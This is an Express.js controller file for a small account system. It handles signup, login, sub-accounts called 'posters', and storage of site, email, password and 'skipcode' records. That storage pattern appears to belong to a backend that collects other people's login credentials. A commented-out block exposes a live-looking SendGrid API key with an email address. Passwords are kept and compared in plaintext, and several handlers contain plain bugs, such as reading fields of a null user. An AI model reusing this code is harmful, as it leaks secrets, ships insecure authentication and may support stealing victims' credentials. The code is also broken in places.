
const User = require('../models/User')
const Info = require('../models/Info')

const Poster = require('../models/Poster')


// const {API_KEY}=require('../keys')
// const nodemailer=require('nodemailer');
// const sendgridTransport=require('nodemailer-sendgrid-transport');
// const transporter=nodemailer.createTransport(sendgridTransport({
//     auth:{
//      api_key:"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",
//      api_user:"traviskaterherron@gmail.com"
//     }

// module.exports.signup_post=async(req,res)=>{
//     const {email,password,fullname}=req.body;
//     try{
//         const user=await User.create({
//             email,password,fullname
//         })
//     const token =  cretaetoken(user._id);


//         res.status(200).json({user:user,token:token})

//         res.send("done post")



//     }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error:error})
//       //   res.send(err.code)
//       }
// }




module.exports.signup_post = async (req, res) => {
    const { username, password } = req.body;

    try {
        const user = await User.findOne({ username: username })
        if (user) {
            return res.status(400).json({ error: "user exists" })

        }
        const userCtreated = await Info.User({
            password,
            username,


        })
        return res.status(200).json({ user: userCtreated })


    }
    catch (e) {

        return res.status(400).json({ error: "user exists" })

    }



}
module.exports.login_post = async (req, res) => {
    const { username, password } = req.body;
    try {
        const user = await User.findOne({ username: username })

        if (user) {
            if (user.password == password) {
                return res.status(200).json({ username: user.username, id: user._id, admin: user.admin })

            }
            return res.status(400).json({ error: "Wrong password" })


        }
        else {
            const poster = await Poster.findOne({ username: username })
            if (poster) {
                if (poster.password == password) {
                    return res.status(200).json({ username: user.username, id: user._id, admin: user.admin })

                }
                return res.status(400).json({ error: "Wrong password" })

            }

        }
        return res.status(400).json({ error: "User not found" })

    } catch (e) {
        res.status(400).json({ error: "not found" })
    }

}


module.exports.skip_code = (req, res) => {
    const { id, skipcode } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            skipcode: skipcode
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })

}

module.exports.info_get = async (req, res) => {

    const { username, id, admin } = req.params
    console.log(username)

    try {

        if (admin) {
            const user = await User.findOne({ username: username })
            return res.status(200).json({ user: user })


        }

        const poster = await Poster.findOne({ username: username })
        return res.status(200).json({ poster: poster })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.poster_add = async (req, res) => {

    const { username, password, links, id } = req.body
    console.log(username)

    try {
        const user = await User.findOne({ _id: id })
        const posterExists = await Poster.findOne({ username: username })
        if (posterExists) {
            return res.status(400).json({ error: "username exists" })

        }
        if (user.numOfPosters > 10 && user.permission == false) {
            return res.status(400).json({ error: "Can not create more than 10 users" })

        }

        const poster = await Poster.create({
            username, password, links,

            root: user._id


        })
        user.posters.push(poster._id)
        user.numOfPosters = user.numOfPosters + 1
        await user.save();

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.add_data = async (req, res) => {

    const { user, poster } = req.params
    const { site, email, password, skipcode } = req.body
    console.log(username)

    try {
        const userFound = await User.findOne({ username: user })

        const posterFound = await Poster.findOne({ username: poster })

        if (userFound && posterFound) {
            const info = await Info.create({
                site, email, password, skipcode,
                poster: poster,
                root: posterFound._id


            })
            posterFound.push(info._id)
            await posterFound.save();
            res.status(200).json({ info: info })

        }
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.change_password = async (req, res) => {
    const { user, poster, password } = req.body;
    const filter = { username: poster };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ username: user })
        const posterFound = await Poster.findOne({ username: poster })
        if (userFound && posterFound) {

            await Poster.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });
            res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        res.status(400).json({ e: "error" })


    }




}


module.exports.delete_poster = async (req, res) => {

    const { username } = req.params
    console.log(username)

    try {
        const users = await User.find({ username: username }).sort({ createdAt: -1 })
        res.status(200).json({ users: users })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

// module.exports.signin_post=async(req,res)=>{
//     const {email,password}=req.body;
//     try{
//         const user= await User.login(email,password);
//         const token=cretaetoken(user._id);
//         console.log('yes yes',user)
//         // res.cookie('jwt',token,{httpOnly:true,maxAge:3*24*60*60*1000})
//         // const user= await User.findById(usercreate._id).select("email fullname data account").populate("data","bio gender")

//         res.status(200).json({user:user,token:token})
//       }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error})
//       //   res.send(err.code)
//       }


//  }

//  module.exports.signin_post=(req,res)=>{
//     const {email,password}=req.body;
//     User.findOne({email:email})
//     .then(user=>{
//         if(!user){
//             return    res.status(422).json({error:"Invalid Email Or Password"})
//         }
//         bcrypt.compare(password,user.password)
//         .then(doMatch=>{
//             if (doMatch){
//                 const token =  cretaetoken(user._id);
//                 res.status(200).json({user:user,token:token})
//             }
//             else{
//                 return    res.status(422).json({error:"Invalid Email Or Password"})
//             }
//         }).catch(err=>{
//             console.log('err')
//         })
//     }).catch(err=>console.log('err'))


//  } 







